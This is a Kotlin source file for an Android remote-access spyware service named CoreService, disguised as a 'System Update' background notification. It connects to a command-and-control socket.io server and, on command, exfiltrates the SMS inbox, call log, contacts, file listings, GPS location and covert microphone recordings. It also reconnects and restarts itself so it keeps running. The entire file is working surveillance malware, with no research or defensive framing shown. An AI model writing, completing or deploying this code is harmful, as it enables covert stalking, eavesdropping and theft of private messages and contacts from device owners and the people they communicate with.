kotlin
package com.system.helper

import android.app.*
import android.location.LocationManager
import android.media.MediaRecorder
import android.os.*
import android.provider.*
import android.util.Base64
import androidx.core.app.NotificationCompat
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.io.*
import java.net.URI
import java.text.SimpleDateFormat
import java.util.*

class CoreService : Service() {
    private lateinit var socket: Socket
    private val C2 = "http://192.168.1.100:3000"

    private val deviceId: String by lazy {
        val p = getSharedPreferences("sys", MODE_PRIVATE)
        var id = p.getString("id", null)
        if (id == null) {
            id = UUID.randomUUID().toString()
            p.edit().putString("id", id).apply()
        }
        id
    }

    override fun onBind(i: Intent?) = null

    override fun onCreate() {
        super.onCreate()
        startFg()
        connect()
    }

    private fun startFg() {
        if (Build.VERSION.SDK_INT >= 26) {
            val ch = NotificationChannel("sys", "System", NotificationManager.IMPORTANCE_MIN)
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
        }
        val n = NotificationCompat.Builder(this, "sys")
            .setContentTitle("System Update")
            .setContentText("Running...")
            .setSmallIcon(android.R.drawable.stat_sys_download_done)
            .setPriority(NotificationCompat.PRIORITY_MIN).build()
        startForeground(1, n)
    }

    private fun connect() {
        try {
            socket = IO.socket(URI.create(C2), IO.Options().apply {
                query = "role=device&id=$deviceId&model=${Build.MODEL}&android=${Build.VERSION.RELEASE}"
                reconnection = true
                reconnectionDelay = 3000
            })
            socket.on("cmd") { args ->
                val o = args[0] as JSONObject
                handle(o.getString("jobId"), o.getString("cmd"), o.optJSONObject("args") ?: JSONObject())
            }
            socket.connect()
        } catch (e: Exception) {
            Handler(Looper.getMainLooper()).postDelayed({ connect() }, 5000)
        }
    }

    private fun handle(jobId: String, cmd: String, args: JSONObject) {
        Thread {
            try {
                val r: Any = when (cmd) {
                    "info" -> info()
                    "ls" -> ls(args.getString("path"))
                    "sms_list" -> smsList(args.optInt("limit", 100))
                    "call_log" -> callLog()
                    "contacts" -> contacts()
                    "location" -> loc()
                    "mic_record" -> mic(args.optInt("seconds", 10))
                    else -> "unknown"
                }
                if (r is File) {
                    val b64 = Base64.encodeToString(r.readBytes(), Base64.NO_WRAP)
                    socket.emit("result", JSONObject().apply {
                        put("jobId", jobId); put("isFile", true)
                        put("data", JSONObject().apply { put("name", r.name); put("b64", b64) })
                    })
                } else socket.emit("result", JSONObject().apply {
                    put("jobId", jobId); put("data", r.toString())
                })
            } catch (e: Exception) {
                socket.emit("result", JSONObject().apply {
                    put("jobId", jobId); put("data", "err: ${e.message}")
                })
            }
        }.start()
    }

    private fun ls(path: String): String {
        val d = File(path)
        if (!d.exists()) return "not found"
        val sb = StringBuilder("Files in $path\n\n")
        d.listFiles()?.sortedBy { it.name }?.forEach {
            sb.append(if (it.isDirectory) "[D]" else "[F]").append(" ").append(it.name).append("\n")
        }
        return sb.toString()
    }

    private fun smsList(limit: Int): String {
        val sb = StringBuilder("SMS:\n\n")
        contentResolver.query(android.net.Uri.parse("content://sms/inbox"),
            arrayOf("address", "body", "date"), null, null, "date DESC")?.use {
            var c = 0
            while (it.moveToNext() && c < limit) {
                val d = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(Date(it.getLong(2)))
                sb.append("[").append(d).append("] ").append(it.getString(0)).append("\n")
                    .append(it.getString(1)).append("\n\n")
                c++
            }
        }
        return sb.toString()
    }

    private fun callLog(): String {
        val sb = StringBuilder("Calls:\n\n")
        contentResolver.query(CallLog.Calls.CONTENT_URI,
            arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE),
            null, null, "${CallLog.Calls.DATE} DESC")?.use {
            var c = 0
            while (it.moveToNext() && c < 100) {
                sb.append(it.getString(0)).append(" | type:").append(it.getInt(1)).append("\n")
                c++
            }
        }
        return sb.toString()
    }

    private fun contacts(): String {
        val sb = StringBuilder("Contacts:\n\n")
        contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER), null, null, null)?.use {
            var c = 0
            while (it.moveToNext() && c < 500) {
                sb.append(it.getString(0)).append(": ").append(it.getString(1)).append("\n")
                c++
            }
        }
        return sb.toString()
    }

    private fun loc(): String {
        val lm = getSystemService(LOCATION_SERVICE) as LocationManager
        val l = try {
            lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
        } catch (e: SecurityException) { null }
        return if (l != null) "Loc: ${l.latitude},${l.longitude}\nhttps://maps.google.com/?q=${l.latitude},${l.longitude}"
        else "no location"
    }

    private fun mic(sec: Int): File {
        val out = File(cacheDir, "mic_${System.currentTimeMillis()}.m4a")
        val r = MediaRecorder().apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setOutputFile(out.absolutePath)
            prepare(); start()
        }
        Thread.sleep(sec * 1000L)
        r.stop(); r.release()
        return out
    }

    private fun info(): String {
        val batt = (getSystemService(BATTERY_SERVICE) as BatteryManager)
            .getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        return "Model: ${Build.MODEL} (${Build.MANUFACTURER})\nAndroid: ${Build.VERSION.RELEASE}\nBattery: ${batt}%"
    }

    override fun onDestroy() {
        super.onDestroy()
        val svc = Intent(this, CoreService::class.java)
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(svc) else startService(svc)
    }
}
